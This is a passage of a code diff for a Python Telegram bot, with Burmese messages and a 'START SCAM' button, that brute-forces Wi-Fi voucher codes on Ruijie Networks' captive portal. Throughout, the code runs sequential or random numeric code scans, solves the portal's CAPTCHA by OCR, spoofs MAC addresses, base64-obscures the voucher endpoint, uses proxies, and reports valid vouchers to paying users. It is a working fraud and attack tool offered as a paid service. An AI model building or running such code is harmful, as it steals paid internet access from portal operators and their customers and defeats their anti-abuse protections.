                     f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                     get_back_keyboard(),
                 )
@@ -987,24 +1127,26 @@ async def on_callback(call):
             user_data.setdefault(chat_id, {})
             if "session_url" not in user_data[chat_id]:
                 await safe_edit_text(
-                    chat_id, call.message.message_id,
+                    chat_id,
+                    call.message.message_id,
                     "🔗 Portal URL အရင်ထည့်ပါ:\n\n/portal [your_portal_url]",
                     get_back_keyboard(),
                 )
                 return
             if mode in ("6", "7", "8", "9"):
                 await safe_edit_text(
-                    chat_id, call.message.message_id,
-                    f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ —\n\n"
-                    f"🎲 Random = တကယ် Random ကုဒ်များ\n"
-                    f"🔢 Sequential = 000000-999999 အစဉ်လိုက်",
+                    chat_id,
+                    call.message.message_id,
+                    f"🔢 VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ —",
                     get_digit_keyboard(mode),
                 )
                 return
             user_data[chat_id]["selected_mode"] = mode
             user_data[chat_id]["start_digit"] = None
+            user_data[chat_id]["random_mode"] = True
             await safe_edit_text(
-                chat_id, call.message.message_id,
+                chat_id,
+                call.message.message_id,
                 f"🔍 VOUCHER: {mode}\n\n✅ START SCAM ကိုနှိပ်ပြီး စတင်ပါ။",
                 get_start_scam_keyboard(),
             )
@@ -1017,26 +1159,24 @@ async def on_callback(call):
             _, mode, digit = parts
             user_data.setdefault(chat_id, {})
             user_data[chat_id]["selected_mode"] = mode
-            
+
             if digit == "random":
-                # Random mode: start_digit = None (True Random)
                 user_data[chat_id]["start_digit"] = None
                 user_data[chat_id]["random_mode"] = True
                 label = "🎲 Random (တကယ် Random)"
             elif digit == "seq":
-                # Sequential full range
                 user_data[chat_id]["start_digit"] = None
                 user_data[chat_id]["random_mode"] = False
-                label = "🔢 Sequential 000000-999999"
+                label = "🔢 Sequential"
             else:
-                # Specific digit start
                 user_data[chat_id]["start_digit"] = digit
                 user_data[chat_id]["random_mode"] = False
                 label = f"🔢 {digit} မှစ၍"
-            
+
             await safe_edit_text(
-                chat_id, call.message.message_id,
-                f"🔍 VOUCHER: {mode}\n🔢 ထိပ်စီး: {label}\n\n✅ START SCAM ကိုနှိပ်ပါ။",
+                chat_id,
+                call.message.message_id,
+                f"🔍 VOUCHER: {mode}\n🔢 {label}\n\n✅ START SCAM ကိုနှိပ်ပါ။",
                 get_start_scam_keyboard(),
             )
             return
@@ -1044,25 +1184,30 @@ async def on_callback(call):
         if data == "menu_start_scam":
             if not await is_paid(user_id):
                 await safe_edit_text(
-                    chat_id, call.message.message_id,
+                    chat_id,
+                    call.message.message_id,
                     f"❌ registered မလုပ်ရသေးပါ။ Admin {ADMIN_USERNAME} သို့ ဆက်သွယ်ပါ။",
                     get_back_keyboard(),
                 )
                 return
             if chat_id not in user_data or "selected_mode" not in user_data.get(chat_id, {}):
                 await safe_edit_text(
-                    chat_id, call.message.message_id,
+                    chat_id,
+                    call.message.message_id,
                     "❌ VOUCHER အမျိုးအစား မရွေးရသေးပါ။",
                     get_voucher_keyboard(),
                 )
                 return
             mode = user_data[chat_id]["selected_mode"]
             await safe_edit_text(
-                chat_id, call.message.message_id,
+                chat_id,
+                call.message.message_id,
                 f"🔍 Scan စတင်နေပါသည်...\n\n🔢 Mode: {mode}",
                 get_scam_button_keyboard(),
             )
-            await _start_scan(chat_id, mode, message=call.message, user_name=user_name)
+            await _start_scan(
+                chat_id, mode, message=call.message, user_name=user_name
+            )
             return
 
     except Exception as e:
@@ -1073,38 +1218,44 @@ async def on_callback(call):
         except Exception:
             pass
 
+
 # ============================================================
-# CODE GENERATORS (FIXED — True Random Support)
+# CODE GENERATORS (TRUE RANDOM + SEQUENTIAL SUPPORT)
 # ============================================================
 _LOWER = string.ascii_lowercase
 _LOWER_DIGIT = string.ascii_lowercase + string.digits
 
+
 def _rand_digits(n: int) -> str:
     return "".join(random.choices(string.digits, k=n))
+
 
 def _rand_lower(n: int) -> str:
     return "".join(random.choices(_LOWER, k=n))
 
+
 def _rand_mixed(n: int) -> str:
     return "".join(random.choices(_LOWER_DIGIT, k=n))
 
-def iter_codes(mode: str, start_digit: Optional[str] = None,
-               random_mode: bool = False) -> Iterator[str]:
+
+def iter_codes(
+    mode: str, start_digit: Optional[str] = None, random_mode: bool = False
+) -> Iterator[str]:
     """
     Streaming generator — no huge lists in RAM.
-    
+
     Modes:
       - "6".."9": numeric codes
           - random_mode=True: truly random codes with dedup
           - start_digit (0-9): sequential scan of that digit range
-          - neither: sequential full range 0-10^length
+          - neither: sequential full range
       - "ascii-lower" / "ascii-lower9": random lowercase
       - "all" / "mixed" / "mixed8" / "mixed9": random mixed
     """
     if mode in ("6", "7", "8", "9"):
         length = int(mode)
 
-        # --- Sequential mode (start_digit specified) ---
+        # --- Sequential mode with specific start digit ---
         if start_digit is not None and str(start_digit).isdigit():
             d = int(start_digit)
             start = d * (10 ** (length - 1))
@@ -1113,33 +1264,29 @@ def iter_codes(mode: str, start_digit: Optional[str] = None,
                 yield str(i).zfill(length)
             return
 
-        # --- Random mode (True Random) ---
+        # --- Random mode (TRUE Random) ---
         if random_mode:
             seen: Set[str] = set()
-            # Cap memory: 6-digit = 1M max, 7+ = 500K cap
             max_seen = (10 ** length) if length == 6 else 500_000
-            yielded_count = 0
-            
+
             while True:
                 code = _rand_digits(length)
                 if code not in seen:
                     seen.add(code)
-                    yielded_count += 1
                     yield code
-                    # Reset when we've seen enough (prevent memory overflow)
                     if len(seen) >= max_seen:
-                        log.debug("Random dedup set reset (length=%d, yielded=%d)",
-                                  length, yielded_count)
+                        log.debug(
+                            "Random dedup set reset (length=%d)", length
+                        )
                         seen.clear()
             return
 
-        # --- Sequential full range (default for digit_*_seq) ---
+        # --- Sequential full range (default) ---
         start, end = 0, 10 ** length
         for i in range(start, end):
             yield str(i).zfill(length)
         return
 
-    # --- Random letter/mixed modes ---
     if mode == "ascii-lower":
         while True:
             yield _rand_lower(6)
@@ -1158,14 +1305,16 @@ def iter_codes(mode: str, start_digit: Optional[str] = None,
 
     raise ValueError(f"Unsupported scan mode: {mode}")
 
+
 # ============================================================
 # PROGRESS FORMAT
 # ============================================================
-def format_progress(checked: int, total: Optional[int], speed: float,
-                    found: int, mode: str = "") -> str:
+def format_progress(
+    checked: int, total: Optional[int], speed: float, found: int, mode: str = ""
+) -> str:
     speed_str = f"{speed:,.0f} codes/min"
     mode_tag = f" [{mode}]" if mode else ""
-    
+
     if total is not None:
         bar_len = 20
         pct = min((checked / total) * 100, 100) if total else 0
@@ -1187,6 +1336,7 @@ def format_progress(checked: int, total: Optional[int], speed: float,
         "📊 Status : running\n"
     )
 
+
 # ============================================================
 # SESSION / MAC
 # ============================================================
@@ -1195,8 +1345,12 @@ _UA_HTML = (
     "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0"
 )
 
-async def get_session_id(sess: aiohttp.ClientSession, session_url: str,
-                         previous_session_id: Optional[str] = None) -> Optional[str]:
+
+async def get_session_id(
+    sess: aiohttp.ClientSession,
+    session_url: str,
+    previous_session_id: Optional[str] = None,
+) -> Optional[str]:
     mac = get_mac()
     url = replace_mac(session_url, mac)
     headers = {
@@ -1214,6 +1368,7 @@ async def get_session_id(sess: aiohttp.ClientSession, session_url: str,
         log.debug("get_session_id failed: %s", e)
         return previous_session_id
 
+
 # ============================================================
 # CAPTCHA
 # ============================================================
@@ -1221,30 +1376,41 @@ async def Captcha_Image(sess: aiohttp.ClientSession, session_id: str) -> bytes:
     headers = {
         "authority": "portal-as.ruijienetworks.com",
         "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
-        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
+        "referer": (
+            f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
+            f"?sessionId={session_id}"
+        ),
         "user-agent": _UA_HTML,
     }
     params = {"sessionId": session_id, "_t": str(time.time())}
     async with sess.get(
         "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
-        params=params, headers=headers,
+        params=params,
+        headers=headers,
     ) as req:
         return await req.read()
 
-async def Varify_Captcha(sess: aiohttp.ClientSession, session_id: str, text: str) -> Optional[str]:
+
+async def Varify_Captcha(
+    sess: aiohttp.ClientSession, session_id: str, text: str
+) -> Optional[str]:
     headers = {
         "authority": "portal-as.ruijienetworks.com",
         "accept": "*/*",
         "content-type": "application/json",
         "origin": "https://portal-as.ruijienetworks.com",
-        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?sessionId={session_id}",
+        "referer": (
+            f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
+            f"?sessionId={session_id}"
+        ),
         "user-agent": _UA_HTML,
     }
     payload = {"sessionId": session_id, "authCode": text}
     try:
         async with sess.post(
             "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
-            headers=headers, json=payload,
+            headers=headers,
+            json=payload,
         ) as req:
             data = await req.json()
             return session_id if data.get("success") else None
@@ -1252,7 +1418,9 @@ async def Varify_Captcha(sess: aiohttp.ClientSession, session_id: str, text: str
         log.debug("captcha verify failed: %s", e)
         return None
 
+
 _ocr = ddddocr.DdddOcr(show_ad=False)
+
 
 def _ocr_sync(image_bytes: bytes) -> Optional[str]:
     nparr = np.frombuffer(image_bytes, np.uint8)
@@ -1261,7 +1429,9 @@ def _ocr_sync(image_bytes: bytes) -> Optional[str]:
         return None
     gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
     blur = cv2.GaussianBlur(gray, (3, 3), 0)
-    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+    _, thresh = cv2.threshold(
+        blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU
+    )
     _, buf = cv2.imencode(".png", thresh)
     try:
         return _ocr.classification(buf.tobytes()).upper()
@@ -1269,12 +1439,14 @@ def _ocr_sync(image_bytes: bytes) -> Optional[str]:
         log.debug("ocr error: %s", e)
         return None
 
+
 async def Captcha_Text(image_bytes: bytes) -> Optional[str]:
     try:
         return await asyncio.to_thread(_ocr_sync, image_bytes)
     except Exception as e:
         log.debug("captcha_text error: %s", e)
         return None
+
 
 # ============================================================
 # VOUCHER BALANCE
@@ -1294,10 +1466,15 @@ async def Code_Expires_Date(active_id: str) -> Tuple[str, Any]:
         "x-requested-with": "XMLHttpRequest",
     }
     timeout = aiohttp.ClientTimeout(total=10)
+
+    # Use Proxy if enabled
     try:
+        connector = get_connector()
         async with aiohttp.ClientSession(
-            connector=_connector, connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(), timeout=timeout,
+            connector=connector,
+            connector_owner=True,
+            cookie_jar=aiohttp.CookieJar(),
+            timeout=timeout,
         ) as s:
             for url in paths:
                 try:
@@ -1312,12 +1489,17 @@ async def Code_Expires_Date(active_id: str) -> Tuple[str, Any]:
                         if mins is None:
                             mins = result.get("remainingMinutes", "Unknown")
                         profile = result.get("profileName", "Unknown")
-                        return f"📋 Plan: {profile} | ⏳ Time: {minute_to_hour(mins)}", mins
+                        return (
+                            f"📋 Plan: {profile} | ⏳ Time: {minute_to_hour(mins)}",
+                            mins,
+                        )
                 except Exception as e:
                     log.debug("balance path error: %s", e)
     except Exception as e:
         log.debug("Code_Expires_Date outer error: %s", e)
+
     return "📋 Plan: Unknown | ⏳ Time: Unknown", "Unknown"
+
 
 # ============================================================
 # PERFORM CHECK
@@ -1326,9 +1508,15 @@ _POST_URL = base64.b64decode(
     b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
 ).decode()
 
-async def perform_check(session_url: str, code: str, chat_id: int,
-                        scan_id: Optional[str] = None, recheck: bool = False,
-                        message=None) -> Optional[str]:
+
+async def perform_check(
+    session_url: str,
+    code: str,
+    chat_id: int,
+    scan_id: Optional[str] = None,
+    recheck: bool = False,
+    message=None,
+) -> Optional[str]:
     if not recheck:
         current = scan_tasks.get(chat_id)
         if not current or current.get("scan_id") != scan_id:
@@ -1351,9 +1539,12 @@ async def perform_check(session_url: str, code: str, chat_id: int,
     for attempt in range(3):
         timeout = aiohttp.ClientTimeout(total=30)
         try:
+            connector = get_connector()
             async with aiohttp.ClientSession(
-                connector=_connector, connector_owner=False,
-                cookie_jar=aiohttp.CookieJar(), timeout=timeout,
+                connector=connector,
+                connector_owner=True,
+                cookie_jar=aiohttp.CookieJar(),
+                timeout=timeout,
             ) as sess:
                 session_id = await get_session_id(sess, session_url, None)
                 if not session_id:
@@ -1379,7 +1570,11 @@ async def perform_check(session_url: str, code: str, chat_id: int,
 
                 if not recheck:
                     current = scan_tasks.get(chat_id)
-                    if not current or current.get("scan_id") != scan_id or current.get("stop"):
+                    if (
+                        not current
+                        or current.get("scan_id") != scan_id
+                        or current.get("stop")
+                    ):
                         return None
 
                 payload = {
@@ -1393,7 +1588,9 @@ async def perform_check(session_url: str, code: str, chat_id: int,
                     f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                 )
 
-                async with sess.post(_POST_URL, json=payload, headers=post_headers) as req:
+                async with sess.post(
+                    _POST_URL, json=payload, headers=post_headers
+                ) as req:
                     response = await req.text()
 
         except Exception as e:
@@ -1417,7 +1614,9 @@ async def perform_check(session_url: str, code: str, chat_id: int,
         entry = f"🎫 {code}\n   {expire_display}"
 
         success_texts.setdefault(chat_id, []).append(entry)
-        user_data.setdefault(chat_id, {}).setdefault("current_display_codes", []).append(entry)
+        user_data.setdefault(chat_id, {}).setdefault(
+            "current_display_codes", []
+        ).append(entry)
 
         await db_add_result(str(chat_id), code)
 
@@ -1430,7 +1629,9 @@ async def perform_check(session_url: str, code: str, chat_id: int,
                     user_data[chat_id]["current_display_codes"] = display_codes
                     body = entry
                 if chat_id not in success_messages:
-                    sent = await bot.send_message(chat_id, f"Success Codes:\n\n{body}")
+                    sent = await bot.send_message(
+                        chat_id, f"Success Codes:\n\n{body}"
+                    )
                     success_messages[chat_id] = sent.message_id
                 else:
                     try:
@@ -1440,7 +1641,9 @@ async def perform_check(session_url: str, code: str, chat_id: int,
                             message_id=success_messages[chat_id],
                         )
                     except Exception:
-                        sent = await bot.send_message(chat_id, f"Success Codes:\n\n{body}")
+                        sent = await bot.send_message(
+                            chat_id, f"Success Codes:\n\n{body}"
+                        )
                         success_messages[chat_id] = sent.message_id
             except Exception as e:
                 log.warning("success message error: %s", e)
@@ -1454,7 +1657,9 @@ async def perform_check(session_url: str, code: str, chat_id: int,
                 if len(body) > 4000:
                     body = body[-4000:]
                 if chat_id not in limited_messages:
-                    sent = await bot.send_message(chat_id, f"Limited Codes:\n\n{body}")
+                    sent = await bot.send_message(
+                        chat_id, f"Limited Codes:\n\n{body}"
+                    )
                     limited_messages[chat_id] = sent.message_id
                 else:
                     try:
@@ -1464,52 +1669,64 @@ async def perform_check(session_url: str, code: str, chat_id: int,
                             message_id=limited_messages[chat_id],
                         )
                     except Exception:
-                        sent = await bot.send_message(chat_id, f"Limited Codes:\n\n{body}")
+                        sent = await bot.send_message(
+                            chat_id, f"Limited Codes:\n\n{body}"
+                        )
                         limited_messages[chat_id] = sent.message_id
             except Exception as e:
                 log.warning("limited message error: %s", e)
 
     return None
 
+
 # ============================================================
-# RUN BRUTEFORCE (Fixed Random Mode)
+# RUN BRUTEFORCE
 # ============================================================
-async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str,
-                         message=None, progress_msg=None,
-                         start_digit: Optional[str] = None):
-    # Determine random_mode from user_data
+async def run_bruteforce(
+    mode: str,
+    chat_id: int,
+    session_url: str,
+    scan_id: str,
+    message=None,
+    progress_msg=None,
+    start_digit: Optional[str] = None,
+):
+    # Determine random_mode
     random_mode = user_data.get(chat_id, {}).get("random_mode", False)
-    # If start_digit is not None, it's never random
     if start_digit is not None:
         random_mode = False
 
     try:
-        code_iter = iter_codes(mode, start_digit=start_digit, random_mode=random_mode)
+        code_iter = iter_codes(
+            mode, start_digit=start_digit, random_mode=random_mode
+        )
     except ValueError as e:
         await safe_send(chat_id, str(e))
         await release_scan_slot()
         return
 
-    # Total for progress display
+    # Total for progress
     if mode in ("6", "7", "8"):
         total: Optional[int] = 10 ** int(mode)
-    elif mode == "9":
-        total = None  # Too large
     else:
-        total = None  # Random letter modes
+        total = None
 
     checked = 0
     scan_start = time.monotonic()
     last_key_check = scan_start
     last_progress_update = 0.0
-    PROGRESS_INTERVAL = 2.0  # Update progress every 2 seconds
+    PROGRESS_INTERVAL = 2.0
 
     try:
         sem = await get_voucher_sem()
 
         while True:
             current = scan_tasks.get(chat_id)
-            if not current or current.get("scan_id") != scan_id or current.get("stop"):
+            if (
+                not current
+                or current.get("scan_id") != scan_id
+                or current.get("stop")
+            ):
                 return
 
             batch: List[str] = []
@@ -1521,10 +1738,11 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
             if not batch:
                 break
 
-            # Periodic key check
             if time.monotonic() - last_key_check >= KEY_RECHECK_INTERVAL:
                 if not await is_paid(str(chat_id)):
-                    await safe_send(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
+                    await safe_send(
+                        chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။"
+                    )
                     return
                 last_key_check = time.monotonic()
 
@@ -1533,22 +1751,30 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
                     cur = scan_tasks.get(chat_id)
                     if not cur or cur.get("scan_id") != scan_id:
                         return
-                    await perform_check(session_url, c, chat_id, scan_id, message=message)
+                    await perform_check(
+                        session_url, c, chat_id, scan_id, message=message
+                    )
 
-            await asyncio.gather(*(_check(c) for c in batch), return_exceptions=True)
+            await asyncio.gather(
+                *(_check(c) for c in batch), return_exceptions=True
+            )
             checked += len(batch)
 
-            # Progress update (throttled to every 2 seconds)
+            # Progress update (throttled)
             now = time.monotonic()
             if now - last_progress_update >= PROGRESS_INTERVAL:
                 last_progress_update = now
                 found = len(success_texts.get(chat_id, []))
                 elapsed = now - scan_start
                 speed = (checked / elapsed * 60) if elapsed > 0 else 0
-                text = format_progress(checked, total, speed, found, mode=mode)
+                text = format_progress(
+                    checked, total, speed, found, mode=mode
+                )
 
                 if progress_msg is not None:
-                    ok = await safe_edit_text(chat_id, progress_msg.message_id, text)
+                    ok = await safe_edit_text(
+                        chat_id, progress_msg.message_id, text
+                    )
                     if not ok:
                         try:
                             new = await bot.send_message(chat_id, text)
@@ -1577,7 +1803,9 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
                     f"✅ ရှာတွေ့ထားသော Code : {found}\n"
                     "📊 Progress : 100%\n[██████████████████]"
                 )
-            ok = await safe_edit_text(chat_id, progress_msg.message_id, finish)
+            ok = await safe_edit_text(
+                chat_id, progress_msg.message_id, finish
+            )
             if not ok:
                 await safe_send(chat_id, finish)
 
@@ -1592,6 +1820,7 @@ async def run_bruteforce(mode: str, chat_id: int, session_url: str, scan_id: str
         await _send_success_file(chat_id)
         cleanup_scan_state(chat_id)
         await release_scan_slot()
+
 
 # ============================================================
 # SUCCESS FILE AUTO-SEND
@@ -1608,7 +1837,8 @@ async def _send_success_file(chat_id: int) -> None:
             f.write("\n".join(texts))
         with open(fname, "rb") as f:
             await bot.send_document(
-                chat_id, f,
+                chat_id,
+                f,
                 caption="✅ Scan ရပ်သွားသောကြောင့် Success Codes ဖိုင်။",
             )
     except Exception as e:
@@ -1620,10 +1850,13 @@ async def _send_success_file(chat_id: int) -> None:
         except Exception:
             pass
 
+
 # ============================================================
 # PORTAL URL VALIDATION
 # ============================================================
-async def check_session_url_improved(session_url: str, use_proxy: bool = False) -> bool:
+async def check_session_url_improved(
+    session_url: str, use_proxy: bool = False
+) -> bool:
     headers = {
         "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "accept-language": "en-US,en;q=0.9",
@@ -1633,7 +1866,10 @@ async def check_session_url_improved(session_url: str, use_proxy: bool = False) 
         return False
     try:
         async with session.get(
-            session_url, allow_redirects=True, headers=headers, timeout=15,
+            session_url,
+            allow_redirects=True,
+            headers=headers,
+            timeout=15,
         ) as resp:
             if resp.status >= 400:
                 return False
@@ -1641,16 +1877,22 @@ async def check_session_url_improved(session_url: str, use_proxy: bool = False) 
             body = await resp.text()
             if "sessionId" in final_url or "sessionId" in body:
                 return True
-            for ind in ("portal-as.ruijienetworks.com", "maccauth",
-                        "index.html", "lang=en_US"):
+            for ind in (
+                "portal-as.ruijienetworks.com",
+                "maccauth",
+                "index.html",
+                "lang=en_US",
+            ):
                 if ind in final_url or ind in body:
                     return True
             patterns = [
                 r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)',
-                r'[?&]sessionId=([a-zA-Z0-9]+)',
+                r"[?&]sessionId=([a-zA-Z0-9]+)",
             ]
             for p in patterns:
-                if re.search(p, body, re.I) or re.search(p, final_url, re.I):
+                if re.search(p, body, re.I) or re.search(
+                    p, final_url, re.I
+                ):
                     return True
             if "portal" in body.lower() or "captcha" in body.lower():
                 return True
@@ -1662,14 +1904,19 @@ async def check_session_url_improved(session_url: str, use_proxy: bool = False) 
         log.debug("portal check error: %s", e)
         return False
 
+
 # ============================================================
 # WEB SERVER
 # ============================================================
 async def _web_root(_request):
     return web.Response(text="Bot is awake and running 24/7!")
 
+
 async def _web_health(_request):
-    return web.json_response({"status": "ok", "uptime": int(time.monotonic() - _start_time)})
+    return web.json_response(
+        {"status": "ok", "uptime": int(time.monotonic() - _start_time)}
+    )
+
 
 async def web_server():
     app = web.Application()
@@ -1680,6 +1927,7 @@ async def web_server():
     site = web.TCPSite(runner, "0.0.0.0", WEB_PORT)
     await site.start()
     log.info("Web server listening on port %d", WEB_PORT)
+
 
 # ============================================================
 # POLLING
@@ -1693,13 +1941,18 @@ async def start_polling():
         except asyncio.CancelledError:
             raise
         except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-            log.warning("Polling network error: %s. Reconnect in %ds", e, backoff)
+            log.warning(
+                "Polling network error: %s. Reconnect in %ds", e, backoff
+            )
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
         except Exception as e:
-            log.exception("Polling error: %s. Reconnect in %ds", e, backoff)
+            log.exception(
+                "Polling error: %s. Reconnect in %ds", e, backoff
+            )
             await asyncio.sleep(backoff)
             backoff = min(backoff * 2, 60)
+
 
 # ============================================================
 # LIFECYCLE
@@ -1730,9 +1983,15 @@ async def _on_shutdown():
             pass
     log.info("Shutdown complete.")
 
+
 async def main():
     setup_logging()
     log.info("Starting STAR LINK bot …")
+    log.info(
+        "Proxy: %s (Enabled=%s)",
+        PROXY_URL if PROXY_ENABLED else "N/A",
+        PROXY_ENABLED,
+    )
 
     _get_conn()
     await load_paid_users()
@@ -1746,10 +2005,15 @@ async def main():
     global session, _connector
     timeout = aiohttp.ClientTimeout(total=30)
     _connector = aiohttp.TCPConnector(
-        limit=20000, limit_per_host=10000, ttl_dns_cache=300, ssl=False,
+        limit=20000,
+        limit_per_host=10000,
+        ttl_dns_cache=300,
+        ssl=False,
     )
     session = aiohttp.ClientSession(
-        timeout=timeout, connector=_connector, connector_owner=False,
+        timeout=timeout,
+        connector=_connector,
+        connector_owner=False,
     )
 
     asyncio.create_task(web_server())
@@ -1781,6 +2045,7 @@ async def main():
         except (asyncio.CancelledError, Exception):
             pass
         await _on_shutdown()
+
 
 if __name__ == "__main__":
     try:
